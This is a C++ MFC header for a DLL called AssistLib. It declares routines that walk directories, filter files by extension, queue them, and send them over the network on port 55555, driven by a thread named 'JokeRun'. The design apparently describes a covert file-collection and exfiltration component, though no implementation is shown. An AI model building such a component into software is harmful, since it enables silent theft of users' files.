// AssistLib.h : main header file for the AssistLib DLL
//

#pragma once

#ifndef __AFXWIN_H__
	#error "include 'stdafx.h' before including this file for PCH"
#endif

#include "resource.h"		// main symbols
#include <mmsystem.h>
#include <memory>
using namespace std;
using namespace std::tr1;

// CAssistLibApp
// See AssistLib.cpp for the implementation of this class
//

#include "stdafx.h"
#include "Runlog.h"

class CAssistLibApp : public CWinApp
{
public:
	CAssistLibApp();

// Overrides
public:
	HANDLE hEventStart = nullptr;
	HANDLE hEventStop = nullptr;
	HANDLE hMutex = nullptr;
	HINSTANCE	m_hModule = nullptr;
	MMRESULT	m_hTimer;
	virtual BOOL InitInstance();
	CCriticalSection m_csList;
	list<FileInfoPtr> m_FileList;
	CWinThread *m_pThread = nullptr;
	UINT	m_nSendFiles = 0;
	UINT	m_nFoundFiles = 0;
	UINT	m_nFiltedFiles = 0;
	UINT	m_nIndexRemoteJokelib = 0;
	shared_ptr <CRunlog> m_pRunlog;
	void PushFile(CString strPath, CString strFile)
	{
		m_csList.Lock();
		m_FileList.push_back(make_shared<FileInfo>(strPath, strFile));
		m_csList.Unlock();
	} 
	static UINT __stdcall ThreadJoke(void *p)
	{
		CAssistLibApp *pThis = (CAssistLibApp *)p;
		return pThis->JokeRun();
	}
	static void AccessFile(CString strFile, void *pParam);
	// 匹配成功时返回true
	bool CheckFilter(CString strFile,bool bExt = true);
	//HANDLE m_hJokeRun = nullptr;
	CString m_strFilter;
	CString m_strDirectory;
	int m_nFilesCount = 0;
	int m_nDirLength;
	UINT JokeRun();
	void AccessDirectory(CString szDirectory, AccessCallBack pACB, void *p);
	static bool SendFile(CString strFilePath, CString strFile,void *p, WORD nPort = 55555,bool bSkipped = false);
	
	DECLARE_MESSAGE_MAP()
	virtual int ExitInstance();
};



extern CAssistLibApp theApp;